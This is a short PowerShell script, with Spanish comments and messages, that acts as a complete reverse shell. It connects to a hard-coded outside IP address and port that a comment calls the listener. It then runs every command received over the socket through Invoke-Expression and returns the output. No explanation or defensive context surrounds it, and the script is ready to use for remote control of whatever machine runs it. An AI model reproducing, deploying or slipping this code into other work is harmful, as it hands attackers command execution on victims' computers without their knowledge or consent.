try {
    $c = New-Object System.Net.Sockets.TcpClient
    $c.Connect('147.185.221.212', 29377)  # IP del listener y puerto
    $s = $c.GetStream()
    $w = New-Object System.IO.StreamWriter($s)
    $r = New-Object System.IO.StreamReader($s)

    while ($true) {
        $cmd = $r.ReadLine()
        if ($cmd -eq 'exit') { break }
        try { $o = (Invoke-Expression $cmd 2>&1 | Out-String) }
        catch { $o = $_.Exception.Message }
        $w.WriteLine($o)
        $w.Flush()
    }

    $r.Close()
    $w.Close()
    $s.Close()
    $c.Close()
}
catch {
    Write-Host "No se pudo conectar al servidor: $($_.Exception.Message)"
}
